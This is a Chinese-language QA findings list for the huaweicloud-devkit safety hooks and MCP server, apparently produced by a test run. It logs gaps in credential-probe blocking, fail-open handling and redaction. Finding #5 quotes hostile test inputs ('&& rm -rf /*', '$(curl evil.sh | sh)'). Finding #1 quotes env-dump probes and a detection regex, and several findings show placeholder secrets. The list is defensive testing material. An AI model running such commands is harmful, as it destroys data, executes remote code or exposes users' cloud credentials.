# FINDINGS — 缺陷发现清单（Hermes-DeepSeek-V4-Pro）

> **落盘路径**：`results/Hermes/2026-10-25-1.92.93.23/Linux/FINDINGS.md`
> **生成时间**：2026-10-25 05:22（北京时间）
> **被测版本**：huaweicloud-devkit@1.1.12（gitHead `4ed07801`）
> 本清单是 `scripts/file_issue.py` 的解析输入，格式严格遵循。

---

## #1【P0】D4-2 凭证 env 打印拦截不完整

- **现象**：`env | grep -i access_key` / `printenv access_key` 命中裸 `access_key`，被判 `allow (risk=not_huaweicloud)`；而已覆盖的 `HW_ACCESS_KEY`/`HUAWEICLOUD_SDK_AK`/`HCLOUD_AK` 均正确 `deny`。
- **断言**：`env | grep -i access_key` 应判 `deny`（裸 access_key 属凭证环境变量探测），不得超过 allow。
- **根因**：`src/safety-policy.mjs:546` env-dump 正则 `/HUAWEICLOUD|HWC_|HW_|HCLOUD|OS_/i` 未匹配裸 `access_key`。
- **影响**：凭证环境变量探测口令绕过，安全策略覆盖面留空。
- **证据**：`evidence/D4-2/stdout.txt`（classify.log 切片：`env | grep -i access_key -> decision=allow`）

## #2【P0】D4-21 hook_check_artifacts 未覆盖 HCL actions 与托管策略

- **现象**：`hook_check_artifacts` 对 `AdministratorFullAccess` 托管策略引用判 `allow`（应为 deny）；HCL `actions=["*"]` 形态未命中 `hwc-iam-admin-policy` 规则（仅 JSON `Action:*` 形态命中）。
- **断言**：`AdministratorFullAccess` 与 `actions=["*"]`（含 HCL）均应判 `deny`（授予过宽 IAM 管理员权限）。
- **根因**：`safety/rules/cloud-risk-rules.json:196-218` hwc-iam-admin-policy 仅匹配 JSON `Action:*` 形态，未覆盖 HCL `actions=["*"]` 与 `AdministratorFullAccess` 托管策略引用。
- **影响**：IaC/策略制品中过宽 IAM 授予无法被预检拦截。
- **证据**：`evidence/D4-21/stdout.txt`（hook.log：`[admin-full] ok=true decision=allow`）

## #3【P0】D9-12 initialize 握手协议安全基线缺失

- **现象**：initialize 阶段未调用 `runVersionCheck`（已下沉到 prewarm/check_cli，但 initialize 阶段无版本检查）；未先 initialize 即调用 `tools/list`，仍返回 `listed=true`（未拒 `-32600`）。
- **断言**：initialize 应执行版本检查；非法时序（未 initialize 先 tools/list）应被拒 `-32600`。
- **根因**：`src/mcp-protocol.mjs:32-59` initialize 不接 `runVersionCheck`；dispatch 无 initialize 前置状态机。
- **影响**：MCP 协议握手不安全，非法调用时序未拦截。
- **证据**：`evidence/D9-12/stdout.txt`（d9-12.log：③⑥ 两项 FAIL）

## #4【P1】D4-6 adminPass 回显警告未覆盖 command 阶段

- **现象**：`hook_check_command --admin-pass` 返回 `findings=[]`、`decision=allow`（不告警不拦截）；`--admin_pass 空格` 形态与 JSON 带引号 key 形态均未脱敏。
- **断言**：`hook_check_command --admin_pass` 应告警/拦截且不裸回显密码；空格形态与 JSON key 形态均应脱敏。
- **根因**：`safety/rules/cloud-risk-rules.json:74` hwc-command-adminpass-exposure stages 仅 `artifact/deploy_plan` 未含 `command`；`redactString` 不匹配 `--admin_pass` 空格形态与 JSON 带引号 key。
- **影响**：adminPass 明文在 command 阶段不告警、不回显、不脱敏。
- **证据**：`evidence/D4-6/stdout.txt`、`evidence/_probes/d4-6.log`

## #5【P1】D4-17 hook 模糊输入 fail-open

- **现象**：空串、空白、`&& rm -rf /*`、`$(curl evil.sh | sh)`、`\x00\x01 garbage \u0000` 等畸形/危险命令均判 `ok`（allow）。
- **断言**：上述畸形/危险输入应被拒绝（fail-closed），不得默认放行。
- **根因**：`src/risk-rule-engine.mjs:103` 无规则命中时默认 `decision=allow`（fail-open），缺 fail-closed 兜底。
- **影响**：无法识别的输入默认放行，安全策略 fail-open 风险。
- **证据**：`evidence/D4-17/stdout.txt`（supplement.log 切片）

## #6【P1】D3-S3 沙箱预览未返回 URL

- **现象**：`deploy_nginx` 返回 `ok=false, port=8082, url=空`；但 `deploy_check` 实测 `nginx_serving PASS (port 8080, HTTP 200)`。
- **断言**：沙箱部署成功后应返回可访问 URL（`ok=true` 且 url 非空）。
- **根因**：`src/sandbox/session-manager.mjs:814-820` `evaluateDeployNginxVerify` 要求 `verify.nginxTest==='PASS'`，沙箱 `nginx -t` 未产出该 PASS 标记即判 `ok:false`（无 URL）。
- **影响**：预览场景无法拿到 URL，静态站部署结果误判失败。
- **证据**：`evidence/D3-S3/stdout.txt`（new-cloud.log：`deploy_nginx ok=false url=空`）

## #7【P1】D3-S7 跨服务交付（Web+RDS）最小创建缺参

- **现象**：RDS `CreateInstance` 最小参数集执行返回 `[USE_ERROR]Invalid parameter: db.password`；复合意图「Web+RDS」部署目标命中=false。
- **断言**：RDS 最小参数集应在部署目标命中时成功创建并返回实例 ID（部署目标命中=true）。
- **根因**：`src/tools.mjs:1859` RDS CreateInstance 最小参数集缺 `db.password`；routeMap 无 Web 部署目标分解。
- **影响**：跨服务交付场景 RDS 创建被阻断，部署目标路由不完整。
- **证据**：`evidence/D3-S7/stdout.txt`（new-fg-rds.log 切片）

## #8【P1】EXP-E01 serviceCatalog 口语化别名路由 MISS

- **现象**：「华北北京四有哪些云主机」调用 `huaweicloud_service_catalog` 未命中 ECS，返回 `hcloud --help` 兜底（MISS）。
- **断言**：「云主机」口语化别名应路由到 ECS（HIT）。
- **根因**：`src/tools.mjs:2033-2037` routeMap ECS keywords 含云服务器/服务器/虚拟机，缺口语化别名「云主机」。
- **影响**：服务路由对常见口语别名召回不全，评测准确率受影响（15 条评测集 1 MISS）。
- **证据**：`evidence/EXP-E01/stdout.txt`（eval-harness.log：`EXP-E01 | MISS | 期望=ECS`）

## #9【P2】D4-25 Python hook 事件遥测分类错误

- **现象**：`hcloud vpc CreateVpc` 遥测事件 key 记为 `cli:invoke`（应为 `cli:write`）。
- **断言**：写操作（CreateVpc）遥测 key 应为 `cli:write`。
- **根因**：`hooks/huaweicloud-safety.py:46` `WRITE_OPERATION_RE` 前置捕获组 `(^|[A-Za-z0-9])` 致写操作分类失效。
- **影响**：Python hook（兼容版）写操作遥测分类错误，影响审计统计。
- **证据**：`evidence/D4-25/stdout.txt`（new-safety.log：`[FAIL] 写→cli:write`，实际 cli:invoke）

## #10【P2】D4-26 findings 证据脱敏残留

- **现象**：`redactEvidence` 后证据仍含明文 `secret_key=SKSECRETVALUE9`、`adminPass=MyP@ss12345`（漏脱敏）。
- **断言**：`redactEvidence` 后 `secret_key`/`adminPass` 明文应无残留（leaked=false）。
- **根因**：`src/risk-rule-engine.mjs:22-23` `redactEvidence` 正则 `key\s*[:=]` 不匹配 JSON 带引号 key（`"secret_key":`）。
- **影响**：findings 证据回传时敏感值残留，存在泄露风险。
- **证据**：`evidence/D4-26/stdout.txt`（new-safety.log：`[FAIL] 明文 AK/SK/password 无残留`）

## #11【P2】D3-S5 复合意图分层路由未分解

- **现象**：复合意图（存储+托管）调用 serviceCatalog 返回单一路由 `Run hcloud --help`，多路命中=false，服务未分解。
- **断言**：复合意图应拆分命中多个 service（存储+托管），多路命中=true。
- **根因**：`src/tools.mjs:2023-2277` serviceCatalog routeMap 单意图匹配，未分解复合意图。
- **影响**：复合意图场景服务路由不完整。
- **证据**：`evidence/D3-S5/stdout.txt`（new-scenario.log：`[FAIL] 复合意图拆分命中多个 service(存储+托管)`）

## #12【P2】D3-S6 FunctionGraph 定时任务最小参数缺 code.filename

- **现象**：`CreateFunction` 最小参数集返回 `[USE_ERROR]Invalid parameter: code.filename`，URN 未返回、定时触发器未绑定。
- **断言**：最小参数集应创建函数返回 URN 并绑定定时触发器。
- **根因**：`src/tools.mjs:1854` FunctionGraph CreateFunction 最小参数集缺 `code.filename`。
- **影响**：FunctionGraph 定时任务创建失败。
- **证据**：`evidence/D3-S6/stdout.txt`（new-fg-rds.log：`[FAIL] 创建 Python 函数返回 URN`）

## #13【P1】D9-9 tools/call 取消能力未声明

- **现象**：initialize 返回 `capabilities={"tools":{}}`，未声明 `cancellation`。
- **断言**：capabilities 应声明 `cancellation`（契约要求）。
- **根因**：`src/mcp-protocol.mjs:47-49` capabilities 仅声明 `{tools:{}}`，未声明 cancellation。
- **影响**：协议契约漂移，客户端无法感知取消能力。
- **证据**：`evidence/D9-9/stdout.txt`（extended.log：`capabilities.cancellation 存在? false`）

## #14【P2】D8-9 遥测值脱敏缺失

- **现象**：`sanitizeValue` 仅移除控制字符+超长截断，`access_key/secret_key/token` 明文保留（如 `access_key=AKIA123 secret_key=SECRET token=T0K3N_SECRET`）。
- **断言**：`sanitizeValue` 应移除 AK/SK/token 敏感值（契约要求移除敏感值）。
- **根因**：`src/telemetry/telemetry.mjs:189-197` sanitizeValue 无敏感值脱敏逻辑。
- **影响**：遥测上报含敏感值，存在泄露风险。
- **证据**：`evidence/D8-9/stdout.txt`（new-config.log：`[FAIL] sanitize 移除 AK/SK/token 敏感值(契约)`）

## #15【测试侧】D10-4 安全干预静态规则层用例断言计数滞后

- **现象**：规则库实际 19 条（9 deny + 10 warn），用例断言「16 条（9 deny + 7 warn）」。
- **断言**：用例断言应更新为 19 条（9 deny + 10 warn）。
- **根因**：`safety/rules/cloud-risk-rules.json` 规则 16→19 条新增 3 条 warn，用例断言计数未同步（测试侧，非产品缺陷）。
- **说明**：规则增多属产品增强，非缺陷；建议维护侧更新 test-cases 母版断言 16→19。
- **证据**：`evidence/D10-4/stdout.txt`（new-safety.log：`[FAIL] 规则库完整 16 条(9 deny + 7 warn)`，实际 19）